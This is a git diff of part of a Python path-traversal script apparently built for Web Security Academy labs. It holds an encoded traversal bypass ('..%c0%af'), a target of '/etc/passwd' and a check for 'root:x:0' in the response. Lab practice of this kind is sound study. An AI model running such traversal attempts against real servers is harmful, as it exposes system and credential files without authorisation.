@@ -16,7 +16,7 @@ date = datetime.datetime.now()
 print("date", date.date())
 print("time", date.time())
 print('-'*60, "\n")
-path = input("Enter wordlist (/usr/share/rockyout.txt): ")
+path = 'travesal.txt'
 print("------------------------------------")
 
 sub_list = open(path).read()
@@ -28,7 +28,8 @@ bypass = [
     r"..%c0%af"
 ]
 print("------------------------------------")
-a = input("Enter URL (https://0a1c008e0369c1bec03f338d005b0068.web-security-academy.net/image?filename=):")
+print('URL - https://0a4c00010325a23cc05f1c0000ab00b5.web-security-academy.net/image?filename=')
+a = input("Enter URL:")
 filenmae = "/etc/passwd"
 print("\n")
 content = "root:x:0"
